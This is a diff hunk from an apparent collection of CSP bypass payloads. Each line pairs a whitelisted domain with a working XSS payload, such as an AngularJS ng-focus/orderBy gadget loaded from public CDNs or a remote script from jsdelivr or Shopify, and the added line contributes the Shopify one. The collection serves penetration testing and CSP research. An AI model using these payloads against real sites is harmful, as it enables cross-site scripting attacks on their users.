@@ -24,6 +24,7 @@ c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=js
 cdn.bootcdn.net	<body ng-app ng-csp><script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.0/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
 cdn.jsdelivr.net	<body ng-app ng-csp><script src="https://cdn.jsdelivr.net/npm/angular@1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
 cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>	ajxchapman
+cdn.shopify.com	<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/files/a.js"></script>	renniepak
 cdn.syncfusion.com	<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	renniepak
 cdnjs.cloudflare.com	<body ng-app ng-csp><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
 code.angularjs.org	<body ng-app ng-csp><script src="https://code.angularjs.org/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
